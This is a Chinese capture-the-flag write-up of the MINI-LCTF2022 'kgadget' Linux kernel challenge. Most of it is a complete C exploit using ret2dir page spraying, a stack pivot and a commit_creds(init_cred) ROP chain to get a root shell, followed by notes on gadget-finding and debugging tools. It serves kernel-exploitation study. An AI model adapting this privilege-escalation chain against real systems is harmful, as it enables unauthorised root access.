---
layout: post
tags: [kernel_pwn]
title: "MINI-LCTF2022 kgadget复现 ret2dir"
date: 2022-10-13
author: wsxk
comments: true
---

PS:请观看完[linux内核基础 二](https://wsxk.github.io/linux_kernel_basic_two/)后练习该题<br>

- [题目分析<br>](#题目分析)
- [exp<br>](#exp)
- [遇到的坑<br>](#遇到的坑)
  - [1.新的获取vmlinux工具<br>](#1新的获取vmlinux工具)
  - [2.ROPgadget搜索不全<br>](#2ropgadget搜索不全)
  - [3.gdb用法<br>](#3gdb用法)
  - [4. ret、retf、iretq、iret<br>](#4-retretfiretqiret)
  - [5.使用swapgs_restore_regs_and_return_to_usermode<br>](#5使用swapgs_restore_regs_and_return_to_usermode)
- [reference<br>](#reference)

## 题目分析<br>
只有`kgadget_ioctl`有用
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221013212902.png)<br>
但是它的代码其实不太对劲，需要我们自己看汇编<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221013212950.png)
主要思路是，cmd=114514后，可以通过param（v3 rdx）传入的指针获得函数地址，随后调用<br>
可以看到，它对pt_regs的其他值做了限制，导致你只能使用`r8 r9`两个寄存器<br>，
该题目利用了`direct mapping of all physical memory`的漏洞，通过mmap大量的用户态内存地址，写入同样的payload，（使用栈迁移`stack migration`技术将栈转移到rop_chain中）在物理内存映射区里选择一个地址，有很大的概率会命中rop_chain，最终完成利用。<br>
详细细节可以看[arttnba3的blog](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AMINI-LCTF2022-kgadget)


## exp<br>
```c
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>

size_t commit_creds=0;
size_t prepare_kernel_cred =0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

//ret2usr
void get_root_privilege(){
    //printf("use ret2usr\n"); //don't use user func in kernel space!
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

int fd;
size_t page_size;
size_t * ptr_buff[15000];
size_t pop_rsp_ret = 0xffffffff811483d0;
size_t  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0xffffffff810737fe;
size_t ret = 0xffffffff8108c6f1;
size_t pop_rdi_ret = 0xffffffff8108c6f0;
size_t init_cred = 0xFFFFFFFF82A6B700; 
size_t swapgs_restore_regs_and_return_to_usermode = 0xFFFFFFFF81C00FCB;
size_t try_hit ; 

void make_rop_chain(size_t * addr){
    int i;
    for(i=0;i<(page_size/8-0x30);i++){
        addr[i]= add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
    }
    for (; i < (page_size / 8 - 0x10); i++)
        addr[i] = ret;
    addr[i++] = pop_rdi_ret;
    addr[i++] = init_cred;
    addr[i++] = commit_creds;
    addr[i++] = swapgs_restore_regs_and_return_to_usermode;
    addr[i++] =  *(size_t*) "wsxkwsxk";
    addr[i++] = *(size_t*) "wsxkwsxk";
    addr[i++] = get_root_shell;
    addr[i++] = user_cs;
    addr[i++] = user_rflags;
    addr[i++] = user_sp;
    addr[i++] = user_ss;
}

int main(){
    commit_creds = 0xFFFFFFFF810C92E0;
    save_status();
    fd = open("/dev/kgadget",O_RDWR);
    if(fd<0){
        printf("error in open device!\n");
    }
    page_size  = sysconf(_SC_PAGESIZE);
    printf("start test\n");
    ptr_buff[0]=mmap(NULL,page_size,PROT_WRITE|PROT_READ,MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
    make_rop_chain(ptr_buff[0]);
    int i ;
    for(i=1;i<15000;i++){
        ptr_buff[i]=mmap(NULL,page_size,PROT_WRITE|PROT_READ,MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
        if(!ptr_buff[i]){
            printf("mmap fail!\n");
            exit(-2);
        }
        memcpy(ptr_buff[i],ptr_buff[0],page_size);
        //make_rop_chain(ptr_buff[i]);
    }
    printf("start attack!\n");
    try_hit = 0xffff888000000000 + 0x7000000;//this addr comes from the layout of linux mem
    __asm__(
        "mov r15,0x11111111;"
        "mov r14,0x22222222;"
        "mov r13,0x33333333;"
        "mov r12,0x44444444;"
        "mov rbp,0x55555555;"
        "mov rbx,0x66666666;"
        "mov r11,0x77777777;"
        "mov r10,0x88888888;"
        "mov r9,pop_rsp_ret;"
        "mov r8,try_hit;"
        "mov rax,0x10;"
        "mov rcx,0xcccccccc;"
        "mov rdx,try_hit;"
        "mov rsi,0x1BF52;"
        "mov rdi,fd;"
        "syscall"
    );
    return 0;
}
```

## 遇到的坑<br>
### 1.新的获取vmlinux工具<br>
github搜索 vmlinux-to-elf<br>
可以安装该工具，能够成功提取出可供ida分析的内核文件<br>
```
vmlinux-to-elf input_file output_file
```
### 2.ROPgadget搜索不全<br>
github安装ropper<br>
```
ropper --clear-cache
ropper -f vmlinux --nocolor > gadget.txt
```
### 3.gdb用法<br>
```gdb
gdb vmlinux
add-symbol-file xxx.ko addr -s .data addr -s .bss addr (addr内核root权限通过 cat /sys/module/xxx.ko/sections/.text .data .bss获得)
target remote :1234
b entry_SYSCALL_64 #可以在执行syscall后进行调试
```
### 4. ret、retf、iretq、iret<br>
call 对于 ret（pop rip）<br>
call far 对于 retf（从栈顶弹出 EIP >> CS >> EFLAGS >> ESP >> SS）<br>
iret（4字节） iretq（8字节版本）<br>
### 5.使用swapgs_restore_regs_and_return_to_usermode<br>
因为开启了`kpti`保护

## reference<br>
[arttnba3的blog](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AMINI-LCTF2022-kgadget)<br>
[https://blog.csdn.net/qq_50332504/article/details/124145581](https://blog.csdn.net/qq_50332504/article/details/124145581)